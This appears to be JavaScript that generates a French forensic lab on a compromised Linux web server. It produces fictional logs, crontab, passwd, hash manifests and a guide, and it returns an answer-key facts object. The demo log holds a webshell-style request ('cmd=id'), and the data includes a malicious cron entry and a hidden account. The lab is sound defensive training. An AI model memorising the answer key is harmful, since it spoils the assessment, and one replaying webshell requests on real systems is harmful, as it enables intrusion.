    'tcp   LISTEN 0      511          0.0.0.0:443       0.0.0.0:*     users:(("nginx",pid=568,fd=7))',
    'tcp   LISTEN 0      128          0.0.0.0:873       0.0.0.0:*     users:(("rsync",pid=812,fd=5))',
    'tcp   LISTEN 0      128        127.0.0.1:3306      0.0.0.0:*     users:(("mariadbd",pid=711,fd=24))',
    'udp   UNCONN 0      0       127.0.0.53%lo:53       0.0.0.0:*     users:(("systemd-resolved",pid=132,fd=13))',
    'tcp   ESTAB  0      0          10.20.0.10:443      203.0.113.18:50418 users:(("nginx",pid=571,fd=10))',
    'tcp   ESTAB  0      0          10.20.0.10:443      203.0.113.24:51102 users:(("nginx",pid=572,fd=11))',
    'tcp   ESTAB  0      0          10.20.0.10:80       203.0.113.33:49844 users:(("nginx",pid=573,fd=12))',
    'tcp   ESTAB  0      0          10.20.0.10:22       10.20.0.100:44218 users:(("sshd",pid=351,fd=4),("sshd",pid=2055,fd=4))',
    `tcp   ESTAB  0      0          10.20.0.10:22       ${webshellIp}:56318 users:(("sshd",pid=351,fd=5),("sshd",pid=3114,fd=5))`,
    `tcp   ESTAB  0      0          10.20.0.10:46812    ${outboundTarget} users:(("system-check",pid=4147,fd=5))`,
    'tcp   ESTAB  0      0          10.20.0.10:873      10.20.0.21:53422 users:(("rsync",pid=812,fd=6))',
    'tcp   ESTAB  0      0          10.20.0.10:443      198.51.100.62:48710 users:(("nginx",pid=574,fd=13))',
    'tcp   TIME-WAIT 0    0          10.20.0.10:80       198.51.100.150:43310 users:(("nginx",pid=571,fd=14))',
  ].join("\n") + "\n";

  const cronText = [
    "# /etc/crontab",
    "SHELL=/bin/sh",
    "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin",
    "17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly",
    "25 6    * * *   root    test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily",
    "47 6    * * 7   root    test -x /usr/sbin/anacron || run-parts --report /etc/cron.weekly",
    "52 6    1 * *   root    test -x /usr/sbin/anacron || run-parts --report /etc/cron.monthly",
    "",
    "# /etc/anacrontab",
    "1   5   cron.daily      run-parts --report /etc/cron.daily",
    "7   10  cron.weekly     run-parts --report /etc/cron.weekly",
    "@monthly 15 cron.monthly run-parts --report /etc/cron.monthly",
    "",
    "# /etc/cron.d/e2scrub_all",
    "30 3 * * 0 root test -e /run/systemd/system || service e2scrub_all start",
    "10 3 * * * root test -e /run/systemd/system || service e2scrub_all start --all",
    "",
    "# /etc/cron.d/php",
    "09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi",
    "",
    "# /etc/cron.d/logrotate",
    "15 4 * * * root /usr/sbin/logrotate /etc/logrotate.conf",
    "",
    "# /etc/cron.d/backup-nightly",
    "30 2 * * * root /usr/local/bin/backup-nightly.sh >/var/log/backup-nightly.log 2>&1",
    "",
    "# /etc/cron.d/cache-prime",
    "5 */6 * * * root /usr/local/bin/cache-prime.sh >/var/log/cache-prime.log 2>&1",
    "",
    "# /etc/cron.d/system-cache",
    `*/10 * * * * root ${cronCommand}`,
  ].join("\n") + "\n";

  const modifiedRows = [];
  const modifiedFiles = [
    [101800, 8, "-rw-r--r--", 1, "root", "root", 4123, "2026-04-21T08:02:14Z", "/var/log/nginx/access.log"],
    [101801, 8, "-rw-r-----", 1, "syslog", "adm", 2218, "2026-04-21T08:02:15Z", "/var/log/auth.log"],
    [101802, 4, "-rw-------", 1, webUser, webUser, 324, "2026-04-21T08:17:48Z", "/var/lib/php/sessions/sess_c0a12be4"],
    [101803, 4, "-rw-------", 1, webUser, webUser, 284, "2026-04-21T08:18:20Z", "/var/lib/php/sessions/sess_6c44a8f1"],
    [101804, 4, "-rw-------", 1, webUser, webUser, 301, "2026-04-21T09:03:33Z", "/var/lib/php/sessions/sess_0a71b552"],
    [101805, 4, "-rw-------", 1, webUser, webUser, 296, "2026-04-21T09:41:15Z", "/var/lib/php/sessions/sess_9870a411"],
    [101806, 4, "-rw-r--r--", 1, "root", "root", 942, "2026-04-21T10:14:00Z", "/var/cache/apt/pkgcache.bin"],
    [101807, 4, "-rw-r--r--", 1, "root", "root", 843, "2026-04-21T10:14:05Z", "/var/cache/apt/srcpkgcache.bin"],
    [101808, 4, "-rw-r-----", 1, "root", "adm", 1901, "2026-04-21T10:43:09Z", "/var/log/nginx/error.log"],
    [101809, 4, "-rw-------", 1, webUser, webUser, 278, "2026-04-21T11:23:01Z", "/var/lib/php/sessions/sess_2f193a0d"],
    [101810, 4, "-rw-r--r--", 1, webUser, webUser, 18422, "2026-04-21T11:22:51Z", "/var/www/html/espace-adherents/uploads/carte-atelier-0421.jpg"],
    [101811, 4, "-rw-r--r--", 1, webUser, webUser, 19624, "2026-04-21T18:47:23Z", "/var/www/html/espace-adherents/uploads/recu-cotisation-avril.pdf"],
    [101812, 8, "-rw-r--r--", 1, "root", "root", 2144, hiddenAccountCreateIso, "/etc/passwd"],
    [101813, 8, "-rw-r-----", 1, "root", "shadow", 1881, "2026-04-21T14:25:31Z", "/etc/shadow"],
    [101814, 8, "-rw-r--r--", 1, "root", "root", 972, "2026-04-21T14:25:33Z", "/etc/group"],
    [101815, 4, "-rw-r--r--", 1, "root", "root", 86, "2026-04-21T14:21:42Z", "/etc/cron.d/system-cache"],
    [101816, 4, "-rwxr-xr-x", 1, "root", "root", 69, "2026-04-21T14:22:03Z", cronScriptPath],
    [101817, 12, "-rwxr-xr-x", 1, sshServiceAccount, sshServiceAccount, 173, "2026-04-21T14:19:26Z", "/tmp/.cache/system-check"],
    [101818, 4, "-rw-r--r--", 1, "root", "root", 4123, "2026-04-21T14:05:29Z", modifiedSiteFile],
    [101819, 4, "-rw-r--r--", 1, webUser, webUser, 184, "2026-04-21T14:05:28Z", uploadedAbsolute],
    [101820, 4, "-rw-------", 1, webUser, webUser, 312, "2026-04-21T14:06:40Z", "/var/lib/php/sessions/sess_a1fbc903"],
    [101821, 4, "-rw-------", 1, webUser, webUser, 301, "2026-04-21T14:07:52Z", "/var/lib/php/sessions/sess_a1fbc904"],
    [101822, 4, "-rw-r-----", 1, "syslog", "adm", 2440, "2026-04-21T14:18:07Z", "/var/log/auth.log.1"],
    [101823, 4, "-rw-r--r--", 1, "root", "root", 430, "2026-04-21T14:19:50Z", "/var/cache/man/index.db"],
    [101824, 4, "-rw-r--r--", 1, "root", "root", 512, "2026-04-21T14:21:10Z", "/run/motd.dynamic"],
    [101825, 4, "-rw-r--r--", 1, "root", "root", 284, "2026-04-21T14:22:14Z", "/var/log/cache-prime.log"],
    [101826, 4, "-rw-r-----", 1, "syslog", "adm", 1222, "2026-04-21T14:23:44Z", "/var/log/daemon.log"],
    [101827, 4, "-rw-r--r--", 1, "root", "root", 620, "2026-04-21T14:24:12Z", "/var/lib/systemd/timers/stamp-backup-nightly.timer"],
    [101828, 4, "-rw-r--r--", 1, "root", "root", 611, "2026-04-21T14:24:22Z", "/var/lib/systemd/timers/stamp-cache-prime.timer"],
    [101829, 4, "-rw-r--r--", 1, "root", "root", 438, "2026-04-21T14:24:38Z", "/run/systemd/ask-password/ask.1"],
    [101830, 4, "-rw-------", 1, hiddenAccount, hiddenAccount, 122, "2026-04-21T14:26:22Z", `/home/${hiddenAccount}/.bash_history`],
    [101831, 4, "-rw-r--r--", 1, "root", "root", 118, "2026-04-21T14:26:31Z", `/home/${hiddenAccount}/.profile`],
    [101832, 4, "-rw-r--r--", 1, "root", "root", 284, "2026-04-21T14:26:58Z", "/var/log/lastlog"],
    [101833, 4, "-rw-r--r--", 1, "root", "root", 118, "2026-04-21T14:27:12Z", "/var/log/faillog"],
    [101834, 4, "-rw-r-----", 1, "root", "adm", 982, "2026-04-21T14:27:19Z", "/var/log/syslog"],
    [101835, 4, "-rw-r--r--", 1, "root", "root", 233, "2026-04-21T14:27:30Z", "/run/systemd/sessions/3"],
    [101836, 4, "-rw-r--r--", 1, "root", "root", 182, "2026-04-21T14:27:38Z", "/run/systemd/sessions/4"],
    [101837, 4, "-rw-r--r--", 1, "root", "root", 972, "2026-04-21T14:28:08Z", "/var/lib/apt/periodic/update-success-stamp"],
    [101838, 4, "-rw-r--r--", 1, "root", "root", 282, "2026-04-21T14:28:48Z", "/var/lib/php/modules/8.2/fpm/enabled_by_maint"],
    [101839, 4, "-rw-------", 1, webUser, webUser, 276, "2026-04-21T15:08:42Z", "/var/lib/php/sessions/sess_7ab1d240"],
    [101840, 4, "-rw-r--r--", 1, "root", "root", 214, "2026-04-21T17:02:18Z", "/var/cache/ldconfig/aux-cache"],
  ];
  for (const row of modifiedFiles) modifiedRows.push(findLsLine(...row));
  const modifiedText = `${modifiedRows.join("\n")}\n`;

  const passwdEntries = [
    "root:x:0:0:root:/root:/bin/bash",
    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
    "bin:x:2:2:bin:/bin:/usr/sbin/nologin",
    "sys:x:3:3:sys:/dev:/usr/sbin/nologin",
    "sync:x:4:65534:sync:/bin:/bin/sync",
    "games:x:5:60:games:/usr/games:/usr/sbin/nologin",
    "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin",
    "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin",
    "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin",
    "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin",
    "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin",
    "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin",
    "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
    "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin",
    "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin",
    "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin",
    "_apt:x:42:65534::/nonexistent:/usr/sbin/nologin",
    "systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin",
    "systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin",
    "messagebus:x:100:102::/nonexistent:/usr/sbin/nologin",
    "syslog:x:101:103::/home/syslog:/usr/sbin/nologin",
    "uuidd:x:102:104::/run/uuidd:/usr/sbin/nologin",
    "tcpdump:x:103:105::/nonexistent:/usr/sbin/nologin",
    "sshd:x:104:65534::/run/sshd:/usr/sbin/nologin",
    "mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false",
    "landscape:x:106:110::/var/lib/landscape:/usr/sbin/nologin",
    "pollinate:x:107:1::/var/cache/pollinate:/bin/false",
    "fwupd-refresh:x:108:111:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin",
    `${sshServiceAccount}:x:996:995:Service web:/var/www:/bin/bash`,
    "svc-backup:x:995:994:Sauvegardes Alizé:/var/backups:/usr/sbin/nologin",
    "odiallo:x:1001:1001:Ousmane Diallo:/home/odiallo:/bin/bash",
    "adjovi:x:1002:1002:Brice Adjovi:/home/adjovi:/bin/bash",
    "straore:x:1003:1003:Salimata Traoré:/home/straore:/bin/bash",
    "emballa:x:1004:1004:Estelle Mballa:/home/emballa:/bin/bash",
    "cfall:x:1005:1005:Cheikh Fall:/home/cfall:/bin/bash",
    "nkamga:x:1006:1006:Nadège Kamga:/home/nkamga:/bin/bash",
    `${hiddenAccount}:x:1008:1008:System Maintenance:/home/${hiddenAccount}:/bin/bash`,
  ].join("\n") + "\n";

  const websiteFiles = [
    "/var/www/html/espace-adherents/index.php",
    "/var/www/html/espace-adherents/upload.php",
    "/var/www/html/espace-adherents/logout.php",
    "/var/www/html/espace-adherents/login.php",
    "/var/www/html/espace-adherents/dossier.php",
    "/var/www/html/espace-adherents/contact.php",
    "/var/www/html/espace-adherents/lib/upload-handler.php",
    "/var/www/html/espace-adherents/lib/session.php",
    "/var/www/html/espace-adherents/lib/logger.php",
    "/var/www/html/espace-adherents/lib/router.php",
    "/var/www/html/espace-adherents/config/app.env",
    "/var/www/html/espace-adherents/config/routes.php",
    "/var/www/html/espace-adherents/config/security.php",
    "/var/www/html/espace-adherents/assets/app.js",
    "/var/www/html/espace-adherents/assets/site.css",
    "/var/www/html/espace-adherents/assets/logo.svg",
    "/var/www/html/espace-adherents/assets/print.css",
    "/var/www/html/espace-adherents/assets/member.js",
    "/var/www/html/espace-adherents/assets/member.css",
    "/var/www/html/espace-adherents/templates/header.php",
    "/var/www/html/espace-adherents/templates/footer.php",
    "/var/www/html/espace-adherents/templates/card.php",
    "/var/www/html/espace-adherents/api/profile.php",
    "/var/www/html/espace-adherents/api/upload.php",
    "/var/www/html/espace-adherents/api/messages.php",
    "/var/www/html/espace-adherents/api/session.php",
    "/var/www/html/espace-adherents/modules/adhesions.php",
    "/var/www/html/espace-adherents/modules/cotisations.php",
    "/var/www/html/espace-adherents/modules/notifications.php",
    "/var/www/html/espace-adherents/modules/news.php",
    "/var/www/html/espace-adherents/views/dashboard.php",
    "/var/www/html/espace-adherents/views/upload-form.php",
    "/var/www/html/espace-adherents/views/profile.php",
    "/var/www/html/espace-adherents/views/messages.php",
    "/var/www/html/espace-adherents/views/help.php",
    "/var/www/html/espace-adherents/sql/schema.sql",
    "/var/www/html/espace-adherents/sql/seed.sql",
    "/var/www/html/espace-adherents/vendor/autoload.php",
    "/var/www/html/espace-adherents/vendor/composer/installed.json",
    "/var/www/html/espace-adherents/vendor/composer/ClassLoader.php",
    "/var/www/html/espace-adherents/uploads/.htaccess",
    "/var/www/html/espace-adherents/uploads/index.html",
  ];
  const removedFile = "/var/www/html/espace-adherents/assets/legacy-debug.php";
  const referenceHashes = new Map();
  const currentHashes = new Map();
  for (const filePath of [...websiteFiles, removedFile]) referenceHashes.set(filePath, randomHex(rng, 64));
  for (const filePath of websiteFiles) currentHashes.set(filePath, referenceHashes.get(filePath));
  currentHashes.set(modifiedSiteFile, randomHex(rng, 64));
  currentHashes.set(uploadedAbsolute, randomHex(rng, 64));
  const hashText = [
    "# reference_manifest 2026-04-20T19:00:00Z",
    ...[...referenceHashes.entries()].map(([filePath, hash]) => `${hash}  ${filePath}`),
    "",
    "# current_manifest 2026-04-21T14:32:00Z",
    ...[...currentHashes.entries()].map(([filePath, hash]) => `${hash}  ${filePath}`),
  ].join("\n") + "\n";

  const chronologyTemplate = [
    "# Modèle de chronologie",
    "",
    "| Horodatage UTC | Fait observé | Source |",
    "|---|---|---|",
    "|  |  |  |",
    "|  |  |  |",
    "|  |  |  |",
    "|  |  |  |",
    "|  |  |  |",
  ].join("\n") + "\n";

  const guideText = [
    "# Guide de l’évaluation : incident sur un serveur web Linux",
    "",
    "> Cadre et limites",
    ">",
    "> Toutes les données de ce labo sont fictives.",
    "> Tu analyses des exports figés et tu ne touches à aucun vrai serveur.",
    "> Ne télécharge jamais un script trouvé dans un journal sans l’avoir lu et ne l’exécute jamais sur un système important.",
    "",
    "## Méthode",
    "",
    "1. Commence par l’ordre chronologique : requêtes web, traces SSH, puis indices de persistance.",
    "2. Pour chaque étape sensible, confirme ton hypothèse avec une deuxième preuve dans un autre export.",
    "3. Les heures sont en UTC dans tous les fichiers. Quand une question demande une durée, relève d’abord les deux horodatages exacts.",
    "4. Pour les questions de confinement et d’ordre des actions, appuie-toi sur la leçon de réponse à incident : l’ordre des gestes compte autant que les gestes eux-mêmes.",
    "",
    "## Variante visionneuse du site",
    "",
    "Dans la visionneuse, tape un mot ou un nombre pour ne garder que les lignes qui le contiennent. Tu peux tester avec des exemples génériques comme « failed », « accepted », « sudo » ou « error », puis relire les lignes restantes par famille de preuve.",
    "",
    "## Commandes utiles avec Git Bash",
    "",
    "```bash",
    "cat > demo-auth.log <<'EOF'",
    "Jun 14 08:15:00 lab sshd[1201]: Failed password for invalid user demo from 192.168.70.8 port 41000 ssh2",
    "Jun 14 08:16:10 lab sshd[1202]: Accepted password for demo from 192.168.70.9 port 41010 ssh2",
    "Jun 14 08:20:00 lab sudo[1210]: demo : TTY=pts/0 ; PWD=/home/demo ; USER=root ; COMMAND=/usr/bin/id",
    "EOF",
    "auth_demo=$(grep -nE 'Failed password|Accepted password|sudo' demo-auth.log | wc -l)",
    "cat > demo-acces.log <<'EOF'",
    "192.168.70.9 - - [14/Jun/2026:08:15:10 +0000] \"POST /centre/upload.php HTTP/1.1\" 200 312 \"-\" \"DemoAgent/1.0\"",
    "192.168.70.9 - - [14/Jun/2026:08:16:00 +0000] \"GET /centre/outils.php?cmd=id HTTP/1.1\" 200 81 \"-\" \"DemoAgent/1.0\"",
    "EOF",
    "web_demo=$(grep -nE 'POST /centre/upload.php|cmd=' demo-acces.log | wc -l)",
    "printf 'Démo incident prête pour relier des événements auth : %s ligne(s).\\nDémo incident prête pour relier un upload et un appel web : %s ligne(s).\\n' \"$auth_demo\" \"$web_demo\"",
    "```",
    "",
    "## Commandes utiles avec Windows PowerShell",
    "",
    "```powershell",
    "@'",
    "Jun 14 08:15:00 lab sshd[1201]: Failed password for invalid user demo from 192.168.70.8 port 41000 ssh2",
    "Jun 14 08:16:10 lab sshd[1202]: Accepted password for demo from 192.168.70.9 port 41010 ssh2",
    "Jun 14 08:20:00 lab sudo[1210]: demo : TTY=pts/0 ; PWD=/home/demo ; USER=root ; COMMAND=/usr/bin/id",
    "'@ | Set-Content -Encoding UTF8 demo-auth.log",
    "$authDemo = (Get-Content -Encoding UTF8 \"demo-auth.log\" | Select-String 'Failed password|Accepted password|sudo').Count",
    "@'",
    "192.168.70.9 - - [14/Jun/2026:08:15:10 +0000] \"POST /centre/upload.php HTTP/1.1\" 200 312 \"-\" \"DemoAgent/1.0\"",
    "192.168.70.9 - - [14/Jun/2026:08:16:00 +0000] \"GET /centre/outils.php?cmd=id HTTP/1.1\" 200 81 \"-\" \"DemoAgent/1.0\"",
    "'@ | Set-Content -Encoding UTF8 demo-acces.log",
    "$webDemo = (Get-Content -Encoding UTF8 \"demo-acces.log\" | Select-String 'POST /centre/upload.php|cmd=').Count",
    "\"Démo incident prête pour relier des événements auth : $authDemo ligne(s).\"",
    "\"Démo incident prête pour relier un upload et un appel web : $webDemo ligne(s).\"",
    "```",
    "",
    "## Exemple générique, avec des valeurs inventées et sans rapport avec ce labo",
    "",
    "```bash",
    "echo $(( ($(date -u -d \"2026-06-14T10:05:00Z\" +%s) - $(date -u -d \"2026-06-14T08:15:00Z\" +%s)) / 60 ))",
    "```",
    "",
    "```powershell",
    "(New-TimeSpan -Start ([datetime]'2026-06-14T08:15:00Z') -End ([datetime]'2026-06-14T10:05:00Z')).TotalMinutes",
    "```",
    "",
    "## Repères",
    "",
    "Un fichier ajouté dans l’arborescence web et un fichier du site dont l’empreinte change ne racontent pas la même chose. Le premier décrit le point d’entrée visible ; le second documente l’altération du site existant.",
  ].join("\n") + "\n";

  const files = [
    { name: "lnx-inc-auth.log", data: text(authLog) },
    { name: "lnx-inc-acces.log", data: text(accessLog) },
    { name: "lnx-inc-historique.txt", data: text(historyLines) },
    { name: "lnx-inc-ps.txt", data: text(psText) },
    { name: "lnx-inc-ports.txt", data: text(portsText) },
    { name: "lnx-inc-cron.txt", data: text(cronText) },
    { name: "lnx-inc-fichiers-modifies.txt", data: text(modifiedText) },
    { name: "lnx-inc-passwd.txt", data: text(passwdEntries) },
    { name: "lnx-inc-empreintes.txt", data: text(hashText) },
    { name: "lnx-inc-guide.md", data: text(guideText) },
    { name: "lnx-inc-chronologie.md", data: text(chronologyTemplate) },
  ];

  return {
    files,
    facts: {
      assetNames: {
        authFile: "lnx-inc-auth.log",
        accessFile: "lnx-inc-acces.log",
        historyFile: "lnx-inc-historique.txt",
        psFile: "lnx-inc-ps.txt",
        portsFile: "lnx-inc-ports.txt",
        cronFile: "lnx-inc-cron.txt",
        modifiedFile: "lnx-inc-fichiers-modifies.txt",
        passwdFile: "lnx-inc-passwd.txt",
        hashesFile: "lnx-inc-empreintes.txt",
        guideFile: "lnx-inc-guide.md",
        timelineFile: "lnx-inc-chronologie.md",
      },
      bruteForceIp,
      bruteForceFailureCount: attackFailureTimeline.length,
      webshellIp,
      firstWebshellTime: firstWebshellIso.slice(11, 19),
      uploadedFilePath: uploadedAbsolute,
      webUser,
      sshServiceAccount,
      firstSshSuccessTime: firstSshSuccessIso.slice(11, 19),
      sshSourceIp: webshellIp,
      hiddenAccount,
      cronScriptPath,
      outboundTarget,
      modifiedSiteFile,
      compromiseDurationMinutes: minuteDiff(firstWebshellIso, hiddenAccountCreateIso),
      containmentLetter: "b",
      actionOrderLetter: "d",
      publicIpCount: 3,
    },
  };
}

function buildProjectAssets() {
  const rng = mulberry32(0x514f11aa);
  const auditDate = "2026-04-27";

  const passwdRows = [
    "root:x:0:0:root:/root:/bin/bash",
    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
    "bin:x:2:2:bin:/bin:/usr/sbin/nologin",
    "sys:x:3:3:sys:/dev:/usr/sbin/nologin",
    "sync:x:4:65534:sync:/bin:/bin/sync",
    "games:x:5:60:games:/usr/games:/usr/sbin/nologin",
    "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin",
    "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin",
    "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin",
    "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin",
    "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin",
    "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin",
    "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
    "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin",
    "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin",
    "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin",
    "_apt:x:42:65534::/nonexistent:/usr/sbin/nologin",
    "systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin",
    "systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin",
    "messagebus:x:100:102::/nonexistent:/usr/sbin/nologin",
    "syslog:x:101:103::/home/syslog:/usr/sbin/nologin",
    "uuidd:x:102:104::/run/uuidd:/usr/sbin/nologin",
    "tcpdump:x:103:105::/nonexistent:/usr/sbin/nologin",
    "sshd:x:104:65534::/run/sshd:/usr/sbin/nologin",
    "mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false",
    "landscape:x:106:110::/var/lib/landscape:/usr/sbin/nologin",
    "pollinate:x:107:1::/var/cache/pollinate:/bin/false",
    "fwupd-refresh:x:108:111:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin",
    "svc-web:x:996:995:Service web:/var/www:/usr/sbin/nologin",
    "svc-backup:x:995:994:Service sauvegarde:/var/backups:/bin/bash",
    "odiallo:x:1001:1001:Ousmane Diallo:/home/odiallo:/bin/bash",
    "adjovi:x:1002:1002:Brice Adjovi:/home/adjovi:/bin/bash",
    "straore:x:1003:1003:Salimata Traoré:/home/straore:/bin/bash",
    "emballa:x:1004:1004:Estelle Mballa:/home/emballa:/bin/bash",
    "cfall:x:1005:1005:Cheikh Fall:/home/cfall:/bin/bash",
    "nkamga:x:1006:1006:Nadège Kamga:/home/nkamga:/bin/bash",
  ];

  const shadowRows = [
    `root:${fakeShadow(rng)}:19820:0:99999:7:::`,
    "daemon:*:19600:0:99999:7:::",
    "bin:*:19600:0:99999:7:::",
    "sys:*:19600:0:99999:7:::",
    "sync:*:19600:0:99999:7:::",
    "games:*:19600:0:99999:7:::",
    "man:*:19600:0:99999:7:::",
    "lp:*:19600:0:99999:7:::",
    "mail:*:19600:0:99999:7:::",
    "news:*:19600:0:99999:7:::",
    "uucp:*:19600:0:99999:7:::",
    "proxy:*:19600:0:99999:7:::",
    "www-data:*:19600:0:99999:7:::",
    "backup:*:19600:0:99999:7:::",
    "list:*:19600:0:99999:7:::",
    "irc:*:19600:0:99999:7:::",
    "_apt:*:19600:0:99999:7:::",
    "systemd-network:*:19600:0:99999:7:::",
    "systemd-timesync:*:19600:0:99999:7:::",
    "messagebus:*:19600:0:99999:7:::",
    "syslog:*:19600:0:99999:7:::",
    "uuidd:*:19600:0:99999:7:::",
    "tcpdump:*:19600:0:99999:7:::",
    "sshd:*:19600:0:99999:7:::",
    "mysql:*:19600:0:99999:7:::",
    "landscape:*:19600:0:99999:7:::",
    "pollinate:*:19600:0:99999:7:::",
    "fwupd-refresh:*:19600:0:99999:7:::",
    "svc-web:*:19600:0:99999:7:::",
    `svc-backup:${fakeShadow(rng)}:19855:0:99999:7:::`,
    `odiallo:${fakeShadow(rng)}:19841:0:99999:7:::`,
    `adjovi:${fakeShadow(rng)}:19811:0:99999:7:::`,
    `straore:${fakeShadow(rng)}:19832:0:99999:7:::`,
    "emballa:!:19801:0:99999:7:::",
    "cfall:!:19860:0:99999:7:::",
    "nkamga:*:19820:0:99999:7:::",
  ];

  const risks = [
    { id: "R01", controle: "AC2", mesure: "Désactiver PasswordAuthentication pour les comptes d’administration", vraisemblance: "2", impact: "3", effort: "1" },
    { id: "R02", controle: "AC3", mesure: "Retirer le shell interactif du compte svc-backup", vraisemblance: "2", impact: "3", effort: "1" },
    { id: "R03", controle: "AC4", mesure: "Réduire la délégation NOPASSWD de svc-backup à un seul wrapper", vraisemblance: "2", impact: "2", effort: "1" },
    { id: "R04", controle: "RE3", mesure: "Fermer rsync sur toutes les interfaces publiques", vraisemblance: "2", impact: "3", effort: "1" },
    { id: "R05", controle: "SY1", mesure: "Appliquer les correctifs de sécurité en attente", vraisemblance: "3", impact: "4", effort: "2" },
    { id: "R06", controle: "SY3", mesure: "Ajouter noexec au montage de /tmp", vraisemblance: "2", impact: "2", effort: "1" },
    { id: "R07", controle: "JO3", mesure: "Activer auditd et vérifier sa persistance au démarrage", vraisemblance: "3", impact: "4", effort: "1" },
    { id: "R08", controle: "JO4", mesure: "Réactiver l’envoi des journaux vers srv-log01", vraisemblance: "3", impact: "3", effort: "2" },
    { id: "R09", controle: "SA1", mesure: "Rétablir une sauvegarde réussie quotidienne", vraisemblance: "3", impact: "4", effort: "1" },
    { id: "R10", controle: "SA2", mesure: "Vérifier chaque jour la copie hors site", vraisemblance: "2", impact: "3", effort: "2" },
    { id: "R11", controle: "SE2", mesure: "Bloquer l’exécution de PHP dans le dossier d’upload", vraisemblance: "4", impact: "4", effort: "1" },
    { id: "R12", controle: "SE3", mesure: "Corriger ou retirer le service legacy-sync en échec", vraisemblance: "2", impact: "2", effort: "1" },
  ];

  const controls = [
    { id: "AC1", domaine: "accès et comptes", poids: 3, critere: "Conforme si la valeur effective est no ; partiel si elle est prohibit-password ; non sinon.", statut: "c" },
    { id: "AC2", domaine: "accès et comptes", poids: 3, critere: "Conforme si PasswordAuthentication vaut no ; partiel si la valeur vaut yes mais que l’accès SSH d’administration est limité à une source précise ; non sinon.", statut: "p" },
    { id: "AC3", domaine: "accès et comptes", poids: 2, critere: "Conforme si aucun compte de service n’a de shell interactif ; partiel si un seul compte de service en a un ; non s’il y en a deux ou plus.", statut: "p" },
    { id: "AC4", domaine: "accès et comptes", poids: 2, critere: "Conforme si aucune règle sudo ne donne NOPASSWD ou un joker large à un compte non root ; partiel s’il existe exactement une règle concernée ; non s’il y en a deux ou plus.", statut: "n" },
    { id: "RE1", domaine: "réseau", poids: 2, critere: "Conforme si la politique par défaut en entrée est deny ; partiel si elle est reject ; non sinon.", statut: "c" },
    { id: "RE2", domaine: "réseau", poids: 3, critere: "Conforme si la règle SSH n’autorise qu’une source d’administration précise ; partiel si un sous-réseau restreint est autorisé ; non sinon.", statut: "c" },
    { id: "RE3", domaine: "réseau", poids: 2, critere: "Conforme si trois ports TCP ou moins écoutent sur toutes les interfaces (adresse locale 0.0.0.0) ; partiel si le total vaut quatre ou cinq ; non au-delà.", statut: "p" },
    { id: "RE4", domaine: "réseau", poids: 1, critere: "Conforme si net.ipv4.ip_forward vaut 0 et si rp_filter vaut 1 ; partiel si une seule de ces deux conditions est respectée ; non sinon.", statut: "c" },
    { id: "SY1", domaine: "système et correctifs", poids: 3, critere: "Conforme si aucun correctif de sécurité n’est en attente ; partiel s’il y en a un ou deux ; non s’il y en a trois ou plus.", statut: "n" },
    { id: "SY2", domaine: "système et correctifs", poids: 1, critere: "Conforme si l’occupation disque reste sous 85 % et les inodes sous 80 % ; partiel si l’un des deux seuils est dépassé sans atteindre 95 % ; non si l’un des deux atteint 95 % ou plus.", statut: "c" },
    { id: "SY3", domaine: "système et correctifs", poids: 2, critere: "Conforme si /tmp porte nodev, nosuid et noexec ; partiel si exactement deux de ces options sont présentes ; non sinon.", statut: "c" },
    { id: "SY4", domaine: "système et correctifs", poids: 2, critere: "Conforme si le support standard de la version du système n’est pas terminé à la date d’audit, d’après le calendrier de support fourni ; partiel si le support standard est terminé mais que le support étendu reste actif ; non sinon.", statut: "c" },
    { id: "JO1", domaine: "journalisation", poids: 2, critere: "Conforme si le service de journalisation local est actif ; partiel s’il est relancé de façon intermittente ; non sinon.", statut: "c" },
    { id: "JO2", domaine: "journalisation", poids: 1, critere: "Conforme si la rotation des journaux web est active avec conservation et compression ; partiel si un seul de ces deux éléments manque ; non sinon.", statut: "c" },
    { id: "JO3", domaine: "journalisation", poids: 3, critere: "Conforme si auditd est actif ; partiel s’il est installé mais inactif ; non s’il est absent ou en échec.", statut: "n" },
    { id: "JO4", domaine: "journalisation", poids: 2, critere: "Conforme si l’envoi vers le collecteur central est actif ; partiel si la configuration existe mais reste désactivée ; non si aucune trace de configuration n’existe.", statut: "p" },
    { id: "SA1", domaine: "sauvegardes", poids: 3, critere: "Conforme si la dernière sauvegarde réussie a moins de 24 heures ; partiel si elle date de 24 à 72 heures ; non au-delà.", statut: "p" },
